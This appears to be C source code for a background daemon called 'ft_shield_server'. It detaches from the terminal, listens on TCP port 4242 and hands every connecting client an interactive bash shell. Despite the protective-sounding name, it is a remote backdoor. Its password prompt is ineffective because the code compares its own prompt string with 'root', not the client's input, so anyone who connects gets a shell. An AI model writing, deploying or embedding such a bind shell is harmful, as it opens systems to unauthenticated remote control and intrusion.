#include <stdio.h>
#include <stdlib.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <errno.h>
#include <syslog.h>

#define PORT 4242
#define BACKLOG 3
#define MAX_CLIENTS 3
#define LOCK_FILE_PATH "/var/lock/ft_shield.lock"

void sigchld_handler(int sig) {
    (void)sig;
    int saved_errno = errno;
    while (waitpid(-1, NULL, WNOHANG) > 0) {}
    errno = saved_errno;
}


int acquire_lock(const char *path)
{
    int fd = open(path, O_CREAT | O_RDWR, 0644);
    if (fd < 0) return -1;
    if (flock(fd, LOCK_EX | LOCK_NB) != 0) {
        close(fd);
        return -1;
    }
    char buf[32];
    int len = snprintf(buf, sizeof(buf), "%d\n", getpid());
    ftruncate(fd, 0);
    write(fd, buf, len);
    return fd;
}

void refresh_pid(int fd) {
    if (fd < 0)
        return;
    if (ftruncate(fd, 0) < 0) {
        return;
    }
    lseek(fd, 0, SEEK_SET);
    int pid = getpid();
    char buf[12];
    int len = snprintf(buf, sizeof(buf), "%d", pid);
    write(fd, buf, len);
}

int launch_server(void) {
    syslog(LOG_INFO, "inside launch_server, pid=%d", getpid());
    int server_fd;
    struct sockaddr_in addr;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        syslog(LOG_ERR, "socket failed: %s", strerror(errno));
        closelog();
        exit(1);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt);

    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof addr) < 0) {
        syslog(LOG_ERR, "bind failed: %s", strerror(errno));
        closelog();
        perror("bind"); exit(1);
    }

    if (listen(server_fd, BACKLOG) < 0) {
        syslog(LOG_ERR, "listen failed: %s", strerror(errno));
        closelog();
        perror("listen");
        exit(1);
    }

    syslog(LOG_INFO, "listening on port 4242\n");
    signal(SIGCHLD, sigchld_handler);
    int handled = 0;
    while (1) {
        syslog(LOG_INFO, "entered indefinite while loop\n");
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof client_addr;
        int cfd = accept(server_fd,
                                (struct sockaddr *)&client_addr,
                                &client_len);
        if (cfd < 0) {
            perror("accept");
            syslog(LOG_ERR, "accept failed: %s", strerror(errno));
            closelog();
            continue;
        }

        pid_t pid = fork();
        if (pid == 0) {
            close(server_fd);

            const char *msg = "password: \n";
            write(cfd, msg, strlen(msg));

            char    buf[4096];
            ssize_t    n;

            n = read(cfd, buf, sizeof buf);
            if (n <= 0)
                return -1;
            buf[n-1] = 0;

            if (n > 0 && strcmp(msg, "root") && handled < MAX_CLIENTS) {
                buf[n] = '\0';
                dup2(cfd, STDIN_FILENO);
                dup2(cfd, STDOUT_FILENO);
                dup2(cfd, STDERR_FILENO);
                chdir("/");
                execl("/bin/bash", "bash", "-i", NULL);
            }
            close(cfd);
            _exit(0);
        }
        close(cfd);
        handled++;
    }
    close(server_fd);
    return 0;
}

int main(void) {
    openlog("ft_shield_server", LOG_PID | LOG_CONS, LOG_DAEMON);
    syslog(LOG_INFO, "ft_shield_server is starting, pid=%d", getpid());
    int fd = acquire_lock(LOCK_FILE_PATH);
    if (fd < 0) {
        syslog(LOG_ERR, "another instance is running or lock failed");
        closelog();
        exit(EXIT_FAILURE);
    }
    pid_t pid = fork();
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    if (pid < 0) {
        syslog(LOG_ERR, "fork() failed: %s", strerror(errno));
        return -1;
    }
    umask(0);
    if (setsid() < 0) {
        syslog(LOG_ERR, "setsid() failed: %s", strerror(errno));
        closelog();
        return -1;
    }
    refresh_pid(fd);
    syslog(LOG_INFO, "daemonized, pid=%d", getpid());
    launch_server();
    return 0;
}
